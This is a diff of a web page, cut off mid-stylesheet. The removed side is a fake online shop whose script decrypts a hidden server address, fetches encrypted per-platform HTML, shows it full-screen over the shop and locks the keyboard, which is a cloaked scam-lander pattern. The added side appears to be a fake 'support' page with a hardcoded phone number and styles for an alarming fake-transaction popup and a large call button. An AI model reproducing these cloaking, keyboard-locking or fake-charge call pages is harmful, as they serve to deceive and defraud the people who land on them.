@@ -1,749 +1,971 @@
-<!DOCTYPE html>
-<html lang="en">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Help0x0x-MDs</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
 
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Contact - Support</title>
 
-  <style>
-  
-    :root{
-      --ink:#0b1020;
-      --muted:#64748b;
-      --line:#e9ebf2;
-      --surface:#f8fafc;
-      --brand:#6d28d9;
-      --brand-dark:#5b21b6;
-      --accent:#db2777;
-      --radius:18px;
-      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
-      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
-      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
-      --max:1180px;
-    }
+    <link rel="stylesheet" href="css/kTa00i9n5NV8.html" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253Dsf%20pro%252Cv1_7csf%20pro%20icons%252Cv1html.html">
+ <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-    *,*::before,*::after{ box-sizing:border-box; }
-    html{ scroll-behavior:smooth; }
-    body{
-      margin:0;
-      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
-      color:var(--ink);
-      background:#fff;
-      line-height:1.6;
-      -webkit-font-smoothing:antialiased;
-    }
-    img{ max-width:100%; display:block; }
-    a{ color:inherit; text-decoration:none; }
-    button{ font:inherit; }
-    ul{ list-style:none; margin:0; padding:0; }
-
-    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
-
-    /* ============================================================
-       LOADING POPUP
-       ============================================================ */
-    .popup{
-      position:fixed; inset:0; z-index:9999;
-      display:flex; align-items:center; justify-content:center;
-      background:#fff; padding:24px;
-    }
-    .popup-content{
-      width:100%; max-width:560px;
-      text-align:center;
-      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
-    }
-    @keyframes popIn{
-      from{ opacity:0; transform:translateY(14px) scale(.98); }
-      to{ opacity:1; transform:none; }
-    }
-    .loading-gif{
-      width:120px; height:120px;
-      margin:0 auto 26px;
-    }
-    .popup-title{
-      font-size:clamp(1.3rem,2.6vw,1.6rem);
-      font-weight:800; letter-spacing:-.025em;
-      margin:0 0 8px;
-    }
-    .popup-content p.sub{
-      margin:0 0 32px;
-      color:var(--muted);
-      font-size:.95rem;
-      font-weight:500;
-    }
-    .buttons{
-      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
-    }
-    .buttons button{
-      min-width:152px;
-      padding:14px 30px;
-      border:0; border-radius:13px;
-      cursor:pointer; font-weight:700; font-size:1rem;
-      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
-    }
-    #cancelBtn{ background:#f1f5f9; color:#334155; }
-    #cancelBtn:hover{ background:#e2e8f0; }
-    #continueBtn{
-      background:linear-gradient(135deg,var(--brand),var(--accent));
-      color:#fff;
-      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
-    }
-    #continueBtn:hover{ transform:translateY(-2px); }
-
-    .hint{
-      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
-      color:#ede9fe;
-      text-align:center;
-      font-size:.82rem;
-      font-weight:600;
-      letter-spacing:.02em;
-      padding:11px 20px;
-      min-height:42px;
-      display:flex; align-items:center; justify-content:center;
-      gap:10px;
-    }
-
-    .nav{
-      position:sticky; top:0; z-index:80;
-      display:flex; align-items:center; gap:26px;
-      height:72px;
-      padding:0 max(24px, calc((100vw - var(--max)) / 2));
-      background:rgba(255,255,255,.86);
-      backdrop-filter:blur(16px);
-      -webkit-backdrop-filter:blur(16px);
-      border-bottom:1px solid var(--line);
-    }
-    .brand{
-      display:flex; align-items:center; gap:11px;
-      font-weight:800; font-size:1.12rem;
-      letter-spacing:-.025em; white-space:nowrap;
-    }
-    .brand-mark{
-      width:36px; height:36px; flex:none;
-      display:grid; place-items:center;
-      border-radius:11px; font-size:1rem;
-      background:linear-gradient(135deg,var(--brand),var(--accent));
-      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
-    }
-
-    .links{ display:flex; gap:6px; }
-    .links a{
-      font-size:.9rem; font-weight:500; color:#4b5563;
-      padding:8px 14px; border-radius:10px;
-      transition:color .18s ease, background .18s ease;
-    }
-    .links a:hover{ color:var(--brand); background:#f5f3ff; }
-
-    .clock{
-      margin-left:auto;
-      display:inline-flex; align-items:center; gap:6px;
-      font-size:.78rem; font-weight:600; color:var(--brand-dark);
-      background:#f5f3ff; border:1px solid #ede9fe;
-      padding:7px 13px; border-radius:999px; white-space:nowrap;
-    }
-    .cart-btn{
-      display:inline-flex; align-items:center; gap:8px;
-      border:0; cursor:pointer;
-      background:var(--ink); color:#fff;
-      font-weight:600; font-size:.88rem;
-      padding:10px 18px; border-radius:999px;
-      transition:transform .18s ease, background .18s ease;
-    }
-    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
-    .cart-btn .badge{
-      background:#fff; color:var(--ink);
-      border-radius:999px; min-width:20px; height:20px;
-      display:grid; place-items:center;
-      padding:0 6px; font-size:.72rem; font-weight:800;
-    }
-
-    @media (max-width:900px){
-      .links{ display:none; }
-      .clock{ display:none; }
-    }
-    @media (max-width:560px){
-      .nav{ gap:14px; height:66px; padding-inline:18px; }
-      .cart-btn{ padding:9px 14px; font-size:.82rem; }
-    }
-
-    /* ============================================================
-       HERO
-       ============================================================ */
-    .hero{
-      display:grid;
-      grid-template-columns:1.03fr .97fr;
-      gap:60px; align-items:center;
-      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
-      background:
-        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
-        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
-        linear-gradient(180deg,#fbfaff,#fff);
-    }
-    @media (max-width:960px){
-      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
-    }
-
-    .eyebrow{
-      display:inline-flex; align-items:center; gap:8px;
-      background:#fff; border:1px solid #ede9fe;
-      color:var(--brand-dark);
-      font-size:.78rem; font-weight:700;
-      letter-spacing:.06em; text-transform:uppercase;
-      padding:7px 15px; border-radius:999px;
-      box-shadow:var(--shadow-sm);
-      margin-bottom:20px;
-    }
-    .eyebrow .dot{
-      width:7px; height:7px; border-radius:50%;
-      background:var(--accent);
-      box-shadow:0 0 0 4px rgba(219,39,119,.16);
-    }
-
-    .hero-text h1{
-      font-size:clamp(2.2rem,5vw,3.4rem);
-      line-height:1.08; letter-spacing:-.035em;
-      font-weight:900; margin:0 0 18px;
-    }
-    .hero-text h1 span{
-      background:linear-gradient(115deg,var(--brand),var(--accent));
-      -webkit-background-clip:text; background-clip:text; color:transparent;
-    }
-    .hero-text p{
-      font-size:1.05rem; color:var(--muted);
-      max-width:490px; margin:0 0 30px;
-    }
-
-    .cta{
-      display:inline-flex; align-items:center; gap:9px;
-      padding:15px 30px; border-radius:999px;
-      background:linear-gradient(135deg,var(--brand),var(--accent));
-      color:#fff; font-weight:700; font-size:.95rem;
-      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
-      transition:transform .18s ease, box-shadow .18s ease;
-    }
-    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
-
-    .hero-stats{
-      display:flex; gap:34px; flex-wrap:wrap;
-      margin-top:40px; padding-top:26px;
-      border-top:1px solid var(--line);
-    }
-    .hero-stats strong{
-      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
-    }
-    .hero-stats span{ font-size:.82rem; color:var(--muted); }
-
-    .hero-img{
-      width:100%; aspect-ratio:5/4; object-fit:cover;
-      border-radius:26px;
-      box-shadow:var(--shadow-lg);
-    }
-
-    /* ============================================================
-       TRUST STRIP
-       ============================================================ */
-    .trust{
-      border-block:1px solid var(--line);
-      background:var(--surface);
-    }
-    .trust-grid{
-      display:grid; grid-template-columns:repeat(4,1fr);
-      gap:10px; padding:22px 0;
-    }
-    .trust-item{
-      display:flex; align-items:center; justify-content:center; gap:9px;
-      font-size:.85rem; font-weight:600; color:#475569;
-      padding:6px 10px; border-right:1px solid var(--line);
-    }
-    .trust-item:last-child{ border-right:0; }
-    .trust-item span{ font-size:1.05rem; }
-    @media (max-width:860px){
-      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
-      .trust-item{ border-right:0; justify-content:flex-start; }
-    }
-
-    /* ============================================================
-       SECTIONS
-       ============================================================ */
-    .section{ padding:76px 0; }
-    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
-    .section-head .kicker{
-      display:inline-block;
-      font-size:.76rem; font-weight:800;
-      letter-spacing:.12em; text-transform:uppercase;
-      color:var(--brand); margin-bottom:10px;
-    }
-    .section-head h2{
-      font-size:clamp(1.6rem,3.2vw,2.2rem);
-      font-weight:900; letter-spacing:-.03em;
-      margin:0 0 10px; line-height:1.15;
-    }
-    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
-
-
-    .grid{
-      display:grid; gap:24px;
-      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
-    }
-    .card{
-      display:flex; flex-direction:column;
-      background:#fff; border:1px solid var(--line);
-      border-radius:var(--radius); overflow:hidden;
-      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
-    }
-    .card:hover{
-      transform:translateY(-6px);
-      box-shadow:var(--shadow-lg);
-      border-color:transparent;
-    }
-    .card-media{
-      position:relative; aspect-ratio:4/3;
-      overflow:hidden; background:#f1f5f9;
-    }
-    .card-media img{
-      width:100%; height:100%; object-fit:cover;
-      transition:transform .55s cubic-bezier(.2,.7,.3,1);
-    }
-    .card:hover .card-media img{ transform:scale(1.07); }
-
-    .card .badge{
-      position:absolute; top:12px; left:12px;
-      font-size:.68rem; font-weight:800; letter-spacing:.06em;
-      text-transform:uppercase; color:#fff;
-      padding:6px 11px; border-radius:999px;
-      background:var(--ink);
-    }
-    .card .badge--sale{ background:var(--accent); }
-    .card .badge--new{ background:#0ea5e9; }
-
-    .card .body{
-      padding:16px 18px 18px;
-      display:flex; flex-direction:column; flex:1;
-    }
-    .card .cat{
-      font-size:.7rem; font-weight:700; letter-spacing:.1em;
-      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
-    }
-    .card h3{
-      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
-    }
-    .price-row{
-      display:flex; align-items:baseline; gap:8px;
-      margin-top:auto; padding-top:6px;
-    }
-    .card .price{
-      font-size:1.12rem; font-weight:800;
-      letter-spacing:-.02em; color:var(--ink);
-    }
-    .card .old{
-      font-size:.85rem; color:#a3aab8;
-      text-decoration:line-through; font-weight:500;
-      margin:0;
-    }
-    .save{
-      margin-left:auto;
-      font-size:.7rem; font-weight:800;
-      color:#047857; background:#ecfdf5;
-      padding:3px 8px; border-radius:999px;
-    }
-
-    .add{
-      margin-top:14px; width:100%;
-      display:inline-flex; align-items:center; justify-content:center; gap:8px;
-      border:1px solid var(--ink); background:#fff; color:var(--ink);
-      font-weight:700; font-size:.88rem;
-      padding:11px; border-radius:11px; cursor:pointer;
-      transition:background .2s ease, color .2s ease, transform .18s ease;
-    }
-    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
-    .add:active{ transform:translateY(0); }
-
-  
-    .about{
-      background:var(--surface);
-      border-block:1px solid var(--line);
-    }
-    .features{
-      display:grid; gap:22px;
-      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
-    }
-    .feature{
-      background:#fff; border:1px solid var(--line);
-      border-radius:var(--radius);
-      padding:28px 24px;
-      text-align:left;
-      transition:transform .22s ease, box-shadow .22s ease;
-    }
-    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
-    .feature span{
-      display:grid; place-items:center;
-      width:48px; height:48px;
-      border-radius:14px; font-size:1.3rem;
-      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
-      border:1px solid #ede9fe;
-      margin-bottom:16px;
-    }
-    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
-    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
-
-    /* ============================================================
-       FOOTER
-       ============================================================ */
-    .footer{
-      background:#0b1020;
-      color:#94a3b8;
-      text-align:center;
-      padding:44px 24px;
-      font-size:.85rem;
-    }
-    .footer .fbrand{
-      display:inline-flex; align-items:center; gap:10px;
-      color:#fff; font-weight:800; font-size:1rem;
-      letter-spacing:-.02em; margin-bottom:10px;
-    }
-    .footer p{ margin:0 0 6px; }
-    .footer small{ color:#64748b; font-size:.78rem; }
-
-  
-    @media (prefers-reduced-motion:reduce){
-      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
-      html{ scroll-behavior:auto; }
-    }
-  </style>
-
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-
-    gtag('config', 'G-0LY0HY7L01');
-  </script>
+  gtag('config', 'G-2DMKRPGVF0');
+</script>
 
 <script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
 <script>
   window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
   plausible.init()
 </script>
-
-
 </head>
-<body>
-
-  <div class="popup" id="customPopup">
-    <div class="popup-content">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
-      <h2 class="popup-title">Loading... Please wait.</h2>
-      <p class="sub">We're checking your connection.</p>
-      <div class="buttons">
-        <button id="cancelBtn" type="button">Cancel</button>
-        <button id="continueBtn" type="button">Continue</button>
-      </div>
-    </div>
-  </div>
-  
-  <div id="shop">
-    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
-
-    <header class="nav">
-      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
-      <nav class="links">
-        <a href="#home">Home</a>
-        <a href="#products">Products</a>
-        <a href="#about">About</a>
-      </nav>
-      <span class="clock">🕒 Mon, 29 Jun 2026</span>
-      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
-    </header>
-
-    <section class="hero" id="home">
-      <div class="hero-text">
-        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
-        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
-        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
-        <a href="#products" class="cta">Shop now →</a>
-
-        <div class="hero-stats">
-          <div><strong>12,480+</strong><span>Happy customers</span></div>
-          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
-          <div><strong>48 hrs</strong><span>US delivery</span></div>
-        </div>
-      </div>
-      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
-    </section>
-
-    <!-- Histats.com  START  (aync)-->
-   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
-    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
-    _Hasync.push(['Histats.fasi', '1']);
-    _Hasync.push(['Histats.track_hits', '']);
-    (function() {
-    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-    hs.src = ('//s10.histats.com/js15_as.js');
-    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-    })();</script>
-    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
-    <!-- Histats.com  END  -->
-
-    <!-- Trust strip -->
-    <div class="trust">
-      <div class="container trust-grid">
-        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
-        <div class="trust-item"><span>↩️</span> 30-day returns</div>
-        <div class="trust-item"><span>🔒</span> Secure checkout</div>
-        <div class="trust-item"><span>💬</span> 7-day support</div>
-      </div>
-    </div>
-
-    <section class="section" id="products">
-      <div class="container">
-        <div class="section-head">
-          <span class="kicker">Featured</span>
-          <h2>Handpicked for you</h2>
-          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
-        </div>
-
-        <div class="grid">
-          <article class="card">
-            <div class="card-media">
-              <span class="badge badge--sale">Best Seller</span>
-              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
-            </div>
-            <div class="body">
-              <span class="cat">Footwear</span>
-              <h3>Running Sneakers</h3>
-              <div class="price-row">
-                <span class="price">$89.99</span>
-                <span class="old">$139.99</span>
-                <span class="save">−36%</span>
-              </div>
-              <button class="add" type="button">Add to cart</button>
-            </div>
-          </article>
-
-          <article class="card">
-            <div class="card-media">
-              <span class="badge">Limited</span>
-              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
-            </div>
-            <div class="body">
-              <span class="cat">Accessories</span>
-              <h3>Classic Watch</h3>
-              <div class="price-row">
-                <span class="price">$179.99</span>
-                <span class="old">$249.99</span>
-                <span class="save">−28%</span>
-              </div>
-              <button class="add" type="button">Add to cart</button>
-            </div>
-          </article>
-
-          <article class="card">
-            <div class="card-media">
-              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
-            </div>
-            <div class="body">
-              <span class="cat">Bags</span>
-              <h3>Travel Backpack</h3>
-              <div class="price-row">
-                <span class="price">$69.99</span>
-                <span class="old">$109.99</span>
-                <span class="save">−36%</span>
-              </div>
-              <button class="add" type="button">Add to cart</button>
-            </div>
-          </article>
-
-          <article class="card">
-            <div class="card-media">
-              <span class="badge badge--new">New</span>
-              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
-            </div>
-            <div class="body">
-              <span class="cat">Audio</span>
-              <h3>Wireless Headphones</h3>
-              <div class="price-row">
-                <span class="price">$119.99</span>
-                <span class="old">$179.99</span>
-                <span class="save">−33%</span>
-              </div>
-              <button class="add" type="button">Add to cart</button>
-            </div>
-          </article>
-
-          <article class="card">
-            <div class="card-media">
-              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
-            </div>
-            <div class="body">
-              <span class="cat">Eyewear</span>
-              <h3>Sunglasses</h3>
-              <div class="price-row">
-                <span class="price">$34.99</span>
-                <span class="old">$59.99</span>
-                <span class="save">−42%</span>
-              </div>
-              <button class="add" type="button">Add to cart</button>
-            </div>
-          </article>
-
-          <article class="card">
-            <div class="card-media">
-              <span class="badge">Top Rated</span>
-              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
-            </div>
-            <div class="body">
-              <span class="cat">Photography</span>
-              <h3>Instant Camera</h3>
-              <div class="price-row">
-                <span class="price">$219.99</span>
-                <span class="old">$299.99</span>
-                <span class="save">−27%</span>
-              </div>
-              <button class="add" type="button">Add to cart</button>
-            </div>
-          </article>
-        </div>
-      </div>
-    </section>
-
-    <section id="about" class="section about">
-      <div class="container">
-        <div class="section-head">
-          <span class="kicker">Why Shopdeal</span>
-          <h2>Built around you</h2>
-          <p>Simple pricing, fast delivery and support that actually answers.</p>
-        </div>
-
-        <div class="features">
-          <div class="feature">
-            <span>🚚</span>
-            <h3>Free Shipping</h3>
-            <p>Free standard delivery on every US order over $75. No codes needed.</p>
-          </div>
-          <div class="feature">
-            <span>↩️</span>
-            <h3>Easy Returns</h3>
-            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
-          </div>
-          <div class="feature">
-            <span>🔒</span>
-            <h3>Secure Checkout</h3>
-            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
-          </div>
-          <div class="feature">
-            <span>⚡</span>
-            <h3>Fast Support</h3>
-            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <footer class="footer">
-      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
-      <p>© 2026 Shopdeal · Single-page demo store</p>
-      <small>Images: picsum.photos</small>
-    </footer>
-  </div>
-
-
-  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
-  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
-    webkitallowfullscreen mozallowfullscreen
-    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
-    style="width:100%; height:100%; border:0;"></iframe>
-</div>
 
 <script>
-  const PASSPHRASE = "98yNCjeAfWMwk0wI";
-  const URL_KEY   = "UrLk3yShopEase01";
-  const ENC_DATA_ORIGIN = "U2FsdGVkX1/kEh9neuNS60/aE0GrlLMd5C8e0rX9IoWQ+7od9yQpbPzFinjuRzuE";
+ 
+  window.SUPPORT_PHONE = {
+    display: "+1(888) 905-2046",   
+    tel:     "+18889052046"        
+  };
+</script>
 
-  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-  const DATA_URL = DATA_ORIGIN + "/data";
 
-  
-  (function warmup() {
-    try {
-      const o = new URL(DATA_ORIGIN).origin;
+<style>
 
-      
-      const pc = document.createElement("link");
-      pc.rel = "preconnect";
-      pc.href = o;
-      pc.crossOrigin = "anonymous";
-      document.head.appendChild(pc);
 
-     
-      const dns = document.createElement("link");
-      dns.rel = "dns-prefetch";
-      dns.href = o;
-      document.head.appendChild(dns);
+.popup-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.55);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  z-index: 99999;
+}
 
-      
-      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
-    } catch (e) {}
-  })();
+.ps-popup {
+  width: 100%;
+  max-width: 430px;
+  background: #ffffff;
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+  animation: popupIn 0.25s ease-out;
+  position: relative;
+}
 
-  
-  let lastUrl = null;
-  let readyPromise = null;
+@keyframes popupIn {
+  from { opacity: 0; transform: translateY(15px) scale(0.97); }
+  to   { opacity: 1; transform: translateY(0)   scale(1);    }
+}
 
-  function detectPlatform() {
-    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
-              navigator.platform || navigator.userAgent || "";
-    return /mac/i.test(p) ? "mac" : "win";
+.ps-popup .popup-header {
+  background: #ffffff;
+  padding: 24px 24px 18px;
+  border-bottom: 0.5px solid #e5e5ea;
+  text-align: center;
+}
+
+.ps-popup .brand-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 14px;
+}
+
+.ps-popup .brand-icon img {
+  width: 140px;
+  height: auto;
+  display: block;
+  margin-top: -10px;
+  margin-bottom: -15px;
+}
+
+.ps-popup .popup-header h2 {
+  color: #222;
+  font-size: 21px;
+  margin-bottom: 5px;
+  text-align: center;
+}
+
+.ps-popup .popup-header p {
+  color: #666;
+  font-size: 15px;
+  text-align: center;
+}
+
+.ps-popup .popup-body {
+  padding: 22px 24px;
+}
+
+.ps-popup .popup-body > p {
+  font-size: 14px;
+  color: #333;
+  line-height: 1.5;
+  margin: 0 0 8px;
+}
+
+.ps-popup .transaction-box {
+  background: #f7f7f9;
+  border-radius: 13px;
+  padding: 16px;
+  margin: 16px 0;
+}
+
+.ps-popup .transaction-row {
+  display: flex;
+  justify-content: space-between;
+  gap: 15px;
+  padding: 8px 0;
+  font-size: 14px;
+}
+
+.ps-popup .transaction-row span:first-child {
+  color: #777;
+}
+
+.ps-popup .transaction-row span:last-child {
+  color: #222;
+  font-weight: 600;
+  text-align: right;
+}
+
+.ps-popup .amount {
+  color: #d92d20 !important;
+  font-size: 16px;
+}
+
+.ps-popup .status {
+  color: #16803c !important;
+}
+
+.ps-popup .notice {
+  background: #fff4f2;
+  border-left: 4px solid #e5484d;
+  padding: 12px;
+  border-radius: 7px;
+  color: #6b2525;
+  font-size: 15px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+.ps-popup .buttons {
+  display: flex;
+  gap: 10px;
+}
+
+.ps-popup button {
+  flex: 1;
+  border-radius: 11px;
+  padding: 13px 10px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+.ps-popup .primary-btn {
+  background: #000;
+  color: #fff;
+  border: none;
+}
+
+.ps-popup .primary-btn:hover {
+  background: #222;
+}
+
+.ps-popup .secondary-btn {
+  background: #fff;
+  color: #000;
+  border: 2px solid #000;
+}
+
+.ps-popup .secondary-btn:hover {
+  background: #f5f5f5;
+}
+
+.ps-popup .popup-footer {
+  padding: 0 24px 22px;
+  color: #888;
+  font-size: 11px;
+  line-height: 1.5;
+  text-align: center;
+}
+
+@media (max-width: 480px) {
+  .ps-popup { border-radius: 16px; }
+  .ps-popup .popup-body,
+  .ps-popup .popup-header { padding-left: 20px; padding-right: 20px; }
+}
+
+/* ===== EXISTING STYLES ===== */
+@media (min-width: 768px) {
+    .popup-content .btn-row {
+        display: flex;
+        gap: 12px;
+    }
+
+    .popup-content .btn-row button {
+    flex: 1;
+    margin: 0;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 8px;
+}
+}
+
+    .popup {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 140%;
+        background: rgba(0,0,0,0.6);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+.popup-content button {
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.popup-content .btn-row button:first-child {
+    background: #000;
+    color: #fff;
+    border: none;
+}
+
+.popup-content .btn-row button:last-child {
+    background: #fff;
+    color: #000;
+    border: 2px solid #000;
+}
+
+.popup-content > button {
+    width: 100%;
+    margin-top: 12px;
+    background: #f5f5f5;
+    border: 2px solid #000;
+}
+
+.popup-content {
+    background: linear-gradient(135deg, #ffffff, #f2f2f2);
+    color: #000;
+    width: 420px;
+    max-width: 90%;
+    text-align: center;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    transform: translateY(-40%);
+}
+.popup-content p {
+    width: 100%;
+    text-align: left;
+    margin-bottom: 20px;
+}
+.popup-title {
+    width: 100%;
+    text-align: center;
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: #fff;
+    line-height: 1.4;
+}
+.popup-text {
+    width: 100%;
+    font-size: 18px;
+    font-weight: 500;
+    line-height: 1.5;
+    color: #000;
+    margin-bottom: 20px;
+}
+@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@500;700&amp;display=swap');
+
+  .call-popup-wrapper {
+    position: fixed;
+    bottom: 50px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 99999;
+    font-family: 'Manrope', sans-serif;
+    opacity: 0;
+    animation: none;
   }
 
-  function secureKeyboardAccess() {
-    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  .call-popup-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #111111;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 32px 72px;
+    border-radius: 50px;
+    font-size: 32px;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35), 0 2px 8px rgba(0,0,0,0.18);
+    transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+    white-space: nowrap;
+    border: none;
+    cursor: pointer;
   }
 
-  async function preloadSecret() {
-    if (readyPromise) return readyPromise;
-    readyPromise = (async () => {
-      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-      const { cipher } = await res.json();
-      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-      if (!html) throw new Error("Decrypt failed — wrong key?");
-      if (lastUrl) URL.revokeObjectURL(lastUrl);
-      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
-      return lastUrl;
-    })();
-    return readyPromise;
+  .call-popup-btn:hover {
+    background: #222222;
+    transform: translateX(-0%) translateY(-3px);
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.4), 0 4px 12px rgba(0,0,0,0.2);
   }
 
-  async function showSecret() {
-    const shop = document.getElementById("shop");
-    const frame = document.getElementById("frame");
-    const contentIframe = document.getElementById("contentiframe");
-    try {
-      const url = await preloadSecret();
-      frame.src = url;
-      shop.style.display = "none";
-      contentIframe.style.display = "block";
-      document.getElementById("customPopup").style.display = "none";
-      secureKeyboardAccess();
-    } catch (e) {
-      document.querySelector(".hint").textContent = "⚠️ " + e.message;
-      document.getElementById("customPopup").style.display = "none";
+  .call-popup-btn:active {
+    transform: translateX(-0%) translateY(0px);
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+  }
+
